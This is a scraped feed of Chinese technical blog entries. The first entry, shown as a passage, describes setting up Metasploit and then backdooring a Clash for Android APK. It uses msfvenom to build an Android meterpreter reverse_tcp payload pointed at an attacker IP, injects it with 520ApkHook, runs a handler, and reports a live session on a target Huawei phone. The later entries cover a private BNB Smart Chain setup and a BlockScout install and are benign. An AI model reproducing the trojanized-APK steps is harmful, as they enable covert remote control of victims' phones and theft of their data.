<p><a href="https://unix.stackexchange.com/questions/524552/upgraded-python-and-now-i-cant-run-yum-upgrade">Upgraded Python, and now I can’t run “yum upgrade”</a></p>
</li>
</ul>
<h2 id="安装Postgresql">安装Postgresql:</h2>
<p>一开始直接用yum安装了PostgreSQL 9.2几的版本,发现和安装的msf不兼容。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf6 &gt; db_status</span><br><span class="line">[-] Error <span class="keyword">while</span> running <span class="built_in">command</span> db_status: Your version of PostgreSQL (90224) is too old. Active Record supports PostgreSQL &gt;= 9.3.</span><br></pre></td></tr></table></figure>
<p>后来选择重新安装psql11版本的。参考文章:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/lfxx/p/17616078.html">Centos7 安装 postgresql-11</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/kerrycode/p/14324465.html">PostgreSQL忘记postgres账号的密码怎么办？</a></p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum安装</span></span><br><span class="line">yum install postgresql11 postgresql11-devel postgresql11-libs postgresql11-server -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改环境变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/pgsql-11/bin:<span class="variable">$PATH</span></span><br><span class="line">/usr/pgsql-11/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统启动配置</span></span><br><span class="line">systemctl start postgresql-11</span><br><span class="line">systemctl restart postgresql-11</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忘记密码,可以在配置文件里设置为trust后进入psql</span></span><br><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vim /var/lib/pgsql/11/data/pg_hba.conf</span><br></pre></td></tr></table></figure>
<p>配置msf连接psql:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /opt/metasploit-framework/embedded/framework/config/database.yml.example /opt/metasploit-framework/embedded/framework/config/database.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给msf创建psql用户</span></span><br><span class="line">ALTER USER postgres WITH PASSWORD <span class="string">&#x27;msf&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>参考文章:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/">centos安装msf</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.codenong.com/6790088/">关于linux：Postgresql -bash：psql：找不到命令</a></p>
</li>
</ul>
<h1>安装jdk11:</h1>
<p>参考文章:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/qqq1994_0810/article/details/128196328">centos7两种方式安装jdk11</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/lzllzllzlzz/article/details/118998187">centos7更换jdk版本不生效解决办法</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/ww1984/p/15934103.html">jdk8与jdk11在centos7下的安装</a></p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改环境变量,替换原来的jdk1.8</span></span><br><span class="line">vim /etc/profile.d/jdk11.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向文件中添加如下内容</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/lib/jvm/java-11-openjdk-11.0.21.0.9-1.el7_9.x86_64</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<h1>注入apk:</h1>
<p>使用该github项目: <a href="https://github.com/ba0gu0/520apkhook">https://github.com/ba0gu0/520apkhook</a></p>
<p>下载一个干净的<a href="https://dl.jichangzhu.com/clients/clash_for_android/releases/latest/">apk</a>:</p>
<ol>
<li class="lvl-3">
<p>下载Releases中打包好的jar包</p>
</li>
</ol>
<p><a href="https://github.com/ba0gu0/520apkhook/releases">https://github.com/ba0gu0/520apkhook/releases</a></p>
<ol start="2">
<li class="lvl-3">
<p>msfmsfvenom:</p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方</span></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=服务器ip lport=3306 -o ~/Downloads/msf.apk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自己的</span></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=74.48.x.x lport=10001 -o /jhack/cfa-2.5.12-premium-universal-release.apk </span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>启动msfconsole</p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> lport 10001</span><br><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150435.png" alt="20231223150435" /></p>
<ol start="4">
<li class="lvl-3">
<p>520ApkHook:</p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方教程:</span></span><br><span class="line">java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Downloads/msf.apk</span><br><span class="line"></span><br><span class="line"><span class="comment"># centos7:</span></span><br><span class="line">java -jar a520ApkHook-1.1-jar-with-dependencies.jar /jhack/ClashForAndroid\ 2.5.12.apk /jhack/NewClashForAndroid.apk</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150534.png" alt="20231223150534" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150819.png" alt="20231223150819" /></p>
<ol>
<li class="lvl-3">
<p>520ApkHook工具会生成出一个修改好的pk</p>
</li>
</ol>
<h1>目标安卓手机运行后门app:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223160745.png" alt="20231223160745" /><br />
目标安卓手机安装apk,并运行app.肉鸡上线成功。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取目标手机系统信息</span></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : localhost</span><br><span class="line">OS              : Android 10 - Linux 4.14.116 (aarch64)</span><br><span class="line">Architecture    : aarch64</span><br><span class="line">System Language : zh_CN_<span class="comment">#Hans</span></span><br><span class="line">Meterpreter     : dalvik/android</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取应用列表</span></span><br><span class="line">meterpreter &gt; app_list</span><br><span class="line">Application List</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">Name                                     Package                                   Running  IsSystem</span><br><span class="line">----                                     -------                                   -------  --------</span><br><span class="line">ARCore                                   com.google.ar.core                        <span class="literal">false</span>    <span class="literal">true</span></span><br><span class="line">AREngineServer                           com.huawei.arengine.service               <span class="literal">false</span>    <span class="literal">true</span></span><br><span class="line">AirLink                                  com.huawei.airlink                        <span class="literal">false</span>    <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>更多的msf利用命令可参考:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://iyouport.substack.com/p/-metasploitandroid17">尝试 Metasploit入侵Android移动设备：黑客主义行动力（17）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/m0_74914256/article/details/130502678">Kali Linux利用MSF入侵安卓手机(零基础版超详细)</a></p>
</li>
</ul>
<p>测试结果:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>华为p30 harmonyos 3.0  成功</p>
</li>
<li class="lvl-2">
<p>华为p40 harmonyos 4.0  系统版本号5.10.43  失败</p>
</li>
</ul>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/">centos安装msf</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>DevRecord</category>
      </categories>
      <tags>
        <tag>DevRecord</tag>
      </tags>
  </entry>
  <entry>
    <title>DevRecord-BNBSmartChain私有链初步搭建</title>
    <url>/2022/44900.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>预期效果:在本地私有网络搭建起Bsc全节点，并且验证者节点在白名单内，可以正常打包出块，用户之间可以正常转账。</p>
<h1>依赖环境:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装基础工具</span></span><br><span class="line">yum update -y &amp;&amp; yum install git bzip2 gcc-c++ ntp epel-release nodejs -y</span><br></pre></td></tr></table></figure>
<h2 id="安装go">安装go:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Centos7安装方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载文件,国内</span></span><br><span class="line">wget https://golang.google.cn/dl/go1.19.linux-amd64.tar.gz</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -zxf go1.19.linux-amd64.tar.gz -C /usr/local</span><br><span class="line"><span class="comment"># 配置环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="comment"># 末尾添加以下配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#golang env config</span></span><br><span class="line"><span class="built_in">export</span> GO111MODULE=on</span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/local/go </span><br><span class="line"><span class="built_in">export</span> GOPATH=/home/gopath</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin:<span class="variable">$GOPATH</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到/home目录</span></span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="comment"># 创建gopath文件夹，后面开发和编译过程中用go get安装第三方包会用到</span></span><br><span class="line"><span class="built_in">mkdir</span> gopath</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使变量配置生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment"># 并查看golang的版本</span></span><br><span class="line">go version</span><br><span class="line"></span><br><span class="line"><span class="comment"># GO设置代理环境变量，再拉去golang.org的时候就不需要墙了。</span></span><br><span class="line">go <span class="built_in">env</span> -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>
<h1>geth安装</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 把智能链 [BNB Smart Chain](https://github.com/bnb-chain/bsc)的代码`git clone`下来 </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/bnb-chain/bsc.git</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># git设置代理</span></span><br><span class="line">git config --global http.proxy http://192.168.2.135:7890</span><br><span class="line">git config --global https.proxy http://192.168.2.135:7890</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入bsc项目文件夹，进行源码构建</span></span><br><span class="line">make all</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入geth所在目录</span></span><br><span class="line">/Users/chanjerry/Documents/GitHub/blockchain/bsc-node/bsc/build/bin</span><br><span class="line"><span class="comment"># 看看geth能否正常运行</span></span><br><span class="line">./geth --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
<p>至此，geth客户端就能够正常使用了</p>
<h1>创建创世区块的json配置文件：</h1>
<h2 id="Bsc主网的json配置文件">Bsc主网的json配置文件:</h2>
<p>先参考一下bsc主网的json配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载主网配置压缩包</span></span><br><span class="line">wget   $(curl -s https://api.github.com/repos/bnb-chain/bsc/releases/latest |grep browser_ |grep mainnet |<span class="built_in">cut</span> -d\&quot; -f4)</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">unzip mainnet.zip</span><br><span class="line"><span class="comment"># 打开genesis.json</span></span><br><span class="line">vim genesis.json</span><br></pre></td></tr></table></figure>
<p><code>genesis.json</code>文件用于配置生成以太坊私链网络的创世区块，当我们需要去创建一个创世区块时，我们可以通过修改<code>genesis.json</code>文件内的初始参数将这些数据写入创世区块。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220804102657.png" alt="20220804102657" /></p>
<p>参考<a href="https://icode.best/i/93356646037965">以太坊私链搭建(二)——genesis.json字段解读</a></p>
<blockquote>
<p>alloc: 预定义的钱包列表，可以通过该字段预先在指定钱包地址内预存一定数量得原生代币。这是以太坊预售期间所执行得特定功能。</p>
</blockquote>
<p>bsc主网在创世区块里会创建一系列的系统合约。<br />
参考:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/bnb-chain/bsc-genesis-contract/blob/master/contracts/BSCValidatorSet.sol">创始区块的系统合约github</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.bnbchain.org/docs/learn/system-contract">Build-in System Contract</a></p>
</li>
</ul>
<p>系统合约列表：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>0xffffFFFfFFffffffffffffffFfFFFfffFFFfFFfE</code></p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000001000</code> BSCValidatorSet 管理验证者节点地址列表(查询or更新)，处理来自信标链的数据包</p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000001001</code> SlashIndicator</p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000001002</code> SystemReward  中继者维护系统合约的激励机制。他们将从系统奖励合约中获得奖励</p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000001003</code> TendermintLightClient</p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000001004</code> TokenHub 跨链代币转移</p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000001005</code> RelayerIncentivize</p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000001006</code> RelayerHub 管理 bsc-relayer 的权限。想要运行 bsc-relayer 的人必须调用合约来存入一些 BNB 以获得授权。</p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000001007</code> GovHub 治理合约，处理来自 BC 的治理包</p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000001008</code> TokenManager 在两条链上绑定和解除绑定代币</p>
</li>
<li class="lvl-2">
<p><code>0x0000000000000000000000000000000000002000</code> CrossChain 跨链包预处理，通过 emit 事件发送跨链包到 BC。包预处理包括序列验证和默克尔证明验证</p>
</li>
<li class="lvl-2">
<p><code>b005741528b86F5952469d80A8614591E3c5B632</code> 初始地址1 余额500000000000000000000Wei/500Ether</p>
</li>
<li class="lvl-2">
<p><code>446AA6E0DC65690403dF3F127750da1322941F3e</code> 初始地址2 余额500Ether</p>
</li>
</ul>
<h2 id="自定义创世区块的json配置文件">自定义创世区块的json配置文件:</h2>
<p>参考<a href="https://github.com/bnb-chain/bsc-genesis-contract/blob/master/contracts/BSCValidatorSet.sol">创始区块的系统合约github</a>的readme文件。</p>
<p>how to generate genesis file.</p>
<ol>
<li class="lvl-3">
<p>Edit <code>init_holders.js</code> file to alloc the initial BNB holder. 初始 BNB 持有者</p>
</li>
<li class="lvl-3">
<p>Edit <code>validators.js</code> file to alloc the initial validator set. 初始化验证者列表</p>
</li>
<li class="lvl-3">
<p>Edit <code>generate-validatorset.js</code> file to change fromChainId and toChainId,</p>
</li>
<li class="lvl-3">
<p>Edit <code>generate-tokenhub.js</code> file to change refundRelayReward, minimumRelayFee and maxGasForCallingBEP20.</p>
</li>
<li class="lvl-3">
<p>Edit <code>generate-tendermintlightclient.js</code> file to change chainID and initConsensusStateBytes.</p>
</li>
<li class="lvl-3">
<p>run <code>node generate-genesis.js</code> will generate genesis.json</p>
</li>
</ol>
<h2 id="solc替代solcjs">solc替代solcjs:</h2>
<p>参考：<a href="https://ethereum.stackexchange.com/questions/25681/solc-bin-runtime-not-a-command">Solc “bin-runtime” not a command?</a><br />
<code>generate-genesis.js</code>里面做的主要工作是 使用solc编译合约，正则匹配提取solc编译合约后的<code>Binary of the runtime part</code>，应该是用户实际交易调用这个新合约时需要执行的字节码(即运行时字节码)</p>
<p>初次运行<code>node generate-genesis.js</code>命令时会报错，把输出报错的代码的注释去掉</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ls.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>) <span class="comment">// 去掉注释</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>报错会提示你的solc没有<code>bin-runtime</code>这个参数命令，<br />
npm装的是<code>solcjs</code>,需要自己重装一个<code>solc</code>。参考：<a href="https://www.jianshu.com/p/f472573e3048">Ubuntu20.04+solc+solc-select安装/使用记录</a><br />
选择装<code>solc-select</code>，<code>solc-select</code>是一个基于python的轻量化solc版本管理工具。</p>
<p>安装方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install solc-select</span><br><span class="line"><span class="comment"># 将py第三方包的可执行文件加入到环境变量中</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="built_in">export</span> PATH=/usr/local/python3/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<p>使用方法如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装所有可用版本的solc，也可以指定版本</span></span><br><span class="line">solc-select install 0.6.4</span><br><span class="line">solc-select install [版本号]</span><br><span class="line"><span class="comment"># 切换环境变量中的solc版本</span></span><br><span class="line">solc-select use [版本号]</span><br></pre></td></tr></table></figure>
<p><code>solc</code>重装以后，主要先修改这两个文件</p>
<ol>
<li class="lvl-3">
<p>Edit <code>init_holders.js</code> file to alloc the initial BNB holder. 初始 BNB 持有者</p>
</li>
<li class="lvl-3">
<p>Edit <code>validators.js</code> file to alloc the initial validator set. 初始化验证者列表</p>
</li>
</ol>
<p><code>init_holders.js</code>可不改，修改<code>validators.js</code>的地址为我们自己的钱包地址(矿工钱包)，这样我们的地址就在初始化验证者列表里面，可以通过验证，挖矿打包出块了。<br />
运行命令<code>node generate-genesis.js</code>，生成我们自定义的创始区块配置文件<code>genesis.json</code>。<br />
如果不在初始化验证者列表里加入我们的矿工钱包地址，会出现报错信息:<code>unauthorized validator</code>无效的验证者，无法正常打包出块。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; miner.start(1)</span><br><span class="line">INFO [08-03|15:46:30.837] Transaction pool price threshold updated price=1,000,000,000</span><br><span class="line">null</span><br><span class="line">&gt; INFO [08-03|15:46:30.839] Stored checkpoint snapshot to disk       number=0 <span class="built_in">hash</span>=66f7da..3b9e65</span><br><span class="line">ERROR[08-03|15:46:30.840] init contract failed </span><br><span class="line">ERROR[08-03|15:46:30.840] slash validator failed                   block <span class="built_in">hash</span>=f7d1f8..3b0582 address=0x9fB29AAc15b9A4B7F17c3385939b007540f4d791</span><br><span class="line">INFO [08-03|15:46:30.840] Commit new mining work                   number=1 sealhash=b8fc50..fefd87 uncles=0 txs=0 gas=0 elapsed=2.135ms</span><br><span class="line">WARN [08-03|15:46:30.840] Block sealing failed                     err=<span class="string">&quot;unauthorized validator&quot;</span></span><br></pre></td></tr></table></figure>
<h1>运行节点：</h1>
<p>参考文档<a href="https://docs.bnbchain.org/docs/local">本地 BNB 智能链网络</a></p>
<h2 id="创建节点文件夹">创建节点文件夹:</h2>
<p>创建两个空文件夹来放节点的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Users/chanjerry/Documents/GitHub/blockchain/bsc-node/private_network/node1</span><br><span class="line">/Users/chanjerry/Documents/GitHub/blockchain/bsc-node/private_network/node2</span><br></pre></td></tr></table></figure>
<h2 id="初始化以太坊节点">初始化以太坊节点:</h2>
<p>通过创始区块json配置文件，来初始化以太坊节点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./geth --datadir /Users/chanjerry/Documents/GitHub/blockchain/bsc-node/private_network/node1 init /Users/chanjerry/Documents/GitHub/blockchain/bsc-node/private_network/genesis.json</span><br></pre></td></tr></table></figure>
<h2 id="启动以太坊节点">启动以太坊节点:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./geth --datadir /Users/chanjerry/Documents/GitHub/blockchain/bsc-node/private_network/node1 --networkid 714 console</span><br></pre></td></tr></table></figure>
<h2 id="初始化另一个以太坊节点">初始化另一个以太坊节点:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./geth --datadir /Users/chanjerry/Documents/GitHub/blockchain/bsc-node/private_network/node2 init /Users/chanjerry/Documents/GitHub/blockchain/bsc-node/private_network/genesis.json</span><br></pre></td></tr></table></figure>
<h2 id="启动第二个以太坊节点">启动第二个以太坊节点:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./geth --datadir /Users/chanjerry/Documents/GitHub/blockchain/bsc-node/private_network/node2 --port 30304 --nodiscover --networkid 714 console</span><br></pre></td></tr></table></figure>
<h2 id="导入钱包地址">导入钱包地址:</h2>
<p>通过私钥导入两个钱包地址：1.初始持币者钱包 2.矿工钱包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在geth console里,通过私钥导入钱包</span></span><br><span class="line">web3.personal.importRawKey(<span class="string">&quot;私钥&quot;</span>, <span class="string">&quot;123456(密码)&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>导入成功，可查看已有账户:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; eth.accounts</span><br><span class="line"></span><br><span class="line">[<span class="string">&quot;0x67970d4988a31fbc379add2be5c529bf015bb032&quot;</span>, <span class="string">&quot;0xabe904f6a2661f36c8abd3c5dbaeff2c8214cac7&quot;</span>, <span class="string">&quot;0x9fb29aac15b9a4b7f17c3385939b007540f4d791&quot;</span>]</span><br></pre></td></tr></table></figure>
<h2 id="开始挖矿">开始挖矿:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./geth console --port <span class="string">&quot;30304&quot;</span> --cache 18000 --datadir  <span class="string">&quot;/Users/chanjerry/Documents/GitHub/blockchain/bsc-node/private_network/node2&quot;</span> --mine  --miner.threads=4  --miner.etherbase=0xABe904f6A2661F36C8ABD3c5DBAEFF2C8214cAC7 --allow-insecure-unlock --unlock 0xABe904f6A2661F36C8ABD3c5DBAEFF2C8214cAC7 --http --http.corsdomain * </span><br></pre></td></tr></table></figure>
<p>查看区块数是否增长:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; eth.blockNumber</span><br><span class="line"></span><br><span class="line">5866</span><br></pre></td></tr></table></figure>
<h2 id="将一个节点连接到另一个节点">将一个节点连接到另一个节点:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在一个 geth 控制台中：</span></span><br><span class="line">admin.nodeInfo.enode</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在另一个控制台中：</span></span><br><span class="line">admin.addPeer( &lt;the enode value from the first console&gt; )</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这一步我没连接好，后面只用到了第二个节点就能正常打包出块，用户间能正常转账。</p>
</blockquote>
<h1>用户间转账:</h1>
<h2 id="geth里转账">geth里转账:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># geth console里运行转账命令</span></span><br><span class="line">eth.sendTransaction(&#123;from: <span class="string">&quot;0x9fb29aac15b9a4b7f17c3385939b007540f4d791&quot;</span>, to: <span class="string">&quot;0xABe904f6A2661F36C8ABD3c5DBAEFF2C8214cAC7&quot;</span>, value: web3.toWei(10, <span class="string">&quot;ether&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>
<p>输出信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INFO [08-03|16:45:43.009] Submitted transaction                    hash=0xab6a5a39a3381048f58fd53fec3b757fbdb62d9a256e548266b7cf2253021fb0 from=0x9fB29AAc15b9A4B7F17c3385939b007540f4d791 nonce=2 recipient=0xABe904f6A2661F36C8ABD3c5DBAEFF2C8214cAC7 value=10,000,000,000,000,000,000</span><br><span class="line">&quot;0xab6a5a39a3381048f58fd53fec3b757fbdb62d9a256e548266b7cf2253021fb0&quot;</span><br></pre></td></tr></table></figure>
<p>查看tx信息:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eth.getTransaction(<span class="string">&#x27;0xab6a5a39a3381048f58fd53fec3b757fbdb62d9a256e548266b7cf2253021fb0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  blockHash: &quot;0x5c93aa965f19bdd1840a11832a82f5380d0d8354adfc2c1ae2ce39b0711d68fb&quot;,</span><br><span class="line">  blockNumber: 411,</span><br><span class="line">  from: &quot;0x9fb29aac15b9a4b7f17c3385939b007540f4d791&quot;,</span><br><span class="line">  gas: 21000,</span><br><span class="line">  gasPrice: 1000000000,</span><br><span class="line">  hash: &quot;0xab6a5a39a3381048f58fd53fec3b757fbdb62d9a256e548266b7cf2253021fb0&quot;,</span><br><span class="line">  input: &quot;0x&quot;,</span><br><span class="line">  nonce: 2,</span><br><span class="line">  r: &quot;0xdaffdbafe1a4014796af9b8f39369421b9b3480f43a8edd038b1f25bad98a1a5&quot;,</span><br><span class="line">  s: &quot;0x679648136c1703aec1c43b4e29cdf1f1ea6e01453eda5581c93536386b01ec3f&quot;,</span><br><span class="line">  to: &quot;0xabe904f6a2661f36c8abd3c5dbaeff2c8214cac7&quot;,</span><br><span class="line">  transactionIndex: 0,</span><br><span class="line">  type: &quot;0x0&quot;,</span><br><span class="line">  v: &quot;0x5b8&quot;,</span><br><span class="line">  value: 10000000000000000000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>转账成功</p>
<h2 id="metamask里转账">metamask里转账:</h2>
<p>或者用小狐狸钱包连接本地节点，然后进行转账:<br />
配置好<code>chain id</code>信息:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220803165545.png" alt="20220803165545" /><br />
能够转账成功:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220803165559.png" alt="20220803165559" /></p>
<blockquote>
<p>矿工暂时未能获得挖矿奖励，接下来要继续探索一下</p>
</blockquote>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://ethereum.stackexchange.com/questions/8684/error-no-key-for-given-address-or-file-when-unlocking-coinbase-account">Error “no key for given address or file” when unlocking coinbase account</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/books/geth/part2/miner/start.html">以太坊技术与实现</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.ai2news.com/blog/1590690/">geth 命令行使用 中文翻译</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.bnbchain.org/docs/learn/consensus/#bscvalidatorset-contract">Bnb链文档</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.bnbchain.org/docs/local">Local BNB Smart Chain Network</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/35a161738d83">centos 7 安装golang</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>DevRecord</category>
      </categories>
      <tags>
        <tag>DevRecord</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>DevRecord-BlockScout区块链浏览器初步搭建</title>
    <url>/2022/13133.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>预期效果:配置rpc，先用公开测试网的rpc，能够在区块链浏览器应用中看到数据后，再切成私有链的rpc，能看到自己模拟的交易记录。</p>
<h1>简介:</h1>
<p><code>BlockScout</code>是一个Elixir应用程序，允许用户搜索交易，查看账户和余额，并验证Ethereum上的智能合约，包括分叉和侧链。<br />
<code>BlockScout</code>为用户提供了一个全面的、易于使用的界面，以查看、确认和检查EVM（Ethereum虚拟机）区块链上的交易。BlockScout目前承载着POA网络、xDai Chain、Ethereum Classic、Sokol &amp; Kovan测试网以及许多其他测试网、私有链和侧链。</p>
<h1>部署安装:</h1>
<p>主要参考<a href="https://www.cnblogs.com/dahuige/p/15524428.html">Centos7下安装BlockScout</a>，辅助参考<a href="https://mhxw.life/2021-10-05-blockscout-deployment-guide/">BlockScout 开源浏览器安装部署指南</a></p>
<blockquote>
<p>遇到报错则通过google解决😈😈😈</p>
</blockquote>
<p>这次用的源码编译的部署方式，挺费时的，下次试试docker。</p>
<h2 id="需要的依赖：">需要的依赖：</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220808150135.png" alt="20220808150135" /></p>
<h3 id="安装新版node">安装新版node:</h3>
<p>安装教程里安装的<code>node</code>版本过低,编译时会报如下错,需要装较新版本的<code>node</code></p>
